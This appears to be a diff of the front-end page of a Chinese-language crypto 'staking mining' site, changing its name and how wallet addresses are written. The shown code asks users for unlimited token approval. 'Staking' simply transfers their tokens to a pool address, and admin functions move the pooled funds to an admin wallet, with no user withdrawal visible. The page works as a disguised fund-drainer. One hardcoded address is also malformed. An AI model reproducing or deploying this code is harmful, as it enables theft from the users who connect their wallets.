@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>奥林巴斯道挖矿</title>
+  <title>大唐梦DTM质押挖矿</title>
   <style>
     * { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
     body { background: #0B2A23; color: #fff; margin: 0; padding: 0; }
@@ -39,7 +39,7 @@
 
 <div class="container">
   <div class="header">
-    <div class="title">⛰️ 奥林巴斯道挖矿</div>
+    <div class="title">🏮 大唐梦DTM质押挖矿</div>
     <button class="btn-menu" onclick="toggleMenu()">☰</button>
   </div>
 
@@ -102,15 +102,15 @@
 </div>
 
 <script>
-// ===================== 核心地址 =====================
+// ===================== 全部纯小写地址 =====================
 const TOKEN_CONTRACT = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
 const POOL_ADDRESS   = "0x1160a8dbdfc52407ba1aeba104f673db722eb4f";
-const ADMIN_WALLET   = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
+const ADMIN_WALLET   = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";
 
 let account = null;
 
 function toLower(addr){ return addr ? addr.toLowerCase() : ""; }
-function isAdmin(){ return account && toLower(account) === toLower(ADMIN_WALLET); }
+function isAdmin(){ return account && toLower(account) === ADMIN_WALLET; }
 
 // 菜单切换
 function toggleMenu(){
@@ -151,7 +151,7 @@ async function refreshUserBalance(){
 }
 
 async function getPoolBalance(){
-  const data = "0x70a08231" + toLower(POOL_ADDRESS).slice(2).padStart(64, '0');
+  const data = "0x70a08231" + POOL_ADDRESS.slice(2).padStart(64, '0');
   const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
   return Number(BigInt(res)) / 1e18;
 }
@@ -167,7 +167,7 @@ async function approve(){
   try{
     const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
     const data = "0x095ea7b3"
-      + toLower(POOL_ADDRESS).slice(2).padStart(64, '0')
+      + POOL_ADDRESS.slice(2).padStart(64, '0')
       + max.slice(2).padStart(64, '0');
 
     await window.ethereum.request({
@@ -187,7 +187,7 @@ async function stake(){
   try{
     const amount = BigInt(parseFloat(val) * 1e18);
     const data = "0xa9059cbb"
-      + toLower(POOL_ADDRESS).slice(2).padStart(64, '0')
+      + POOL_ADDRESS.slice(2).padStart(64, '0')
       + amount.toString(16).padStart(64, '0');
 
     await window.ethereum.request({
@@ -216,7 +216,7 @@ async function approvePoolToAdmin(){
   try{
     const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
     const data = "0x095ea7b3"
-      + toLower(ADMIN_WALLET).slice(2).padStart(64, '0')
+      + ADMIN_WALLET.slice(2).padStart(64, '0')
       + max.slice(2).padStart(64, '0');
 
     await window.ethereum.request({
@@ -236,8 +236,8 @@ async function withdrawPoolToAdmin(){
   try{
     const amount = BigInt(parseFloat(val) * 1e18);
     const data = "0x23b872dd"
-      + toLower(POOL_ADDRESS).slice(2).padStart(64, '0')
-      + toLower(ADMIN_WALLET).slice(2).padStart(64, '0')
+      + POOL_ADDRESS.slice(2).padStart(64, '0')
+      + ADMIN_WALLET.slice(2).padStart(64, '0')
       + amount.toString(16).padStart(64, '0');
 
     await window.ethereum.request({
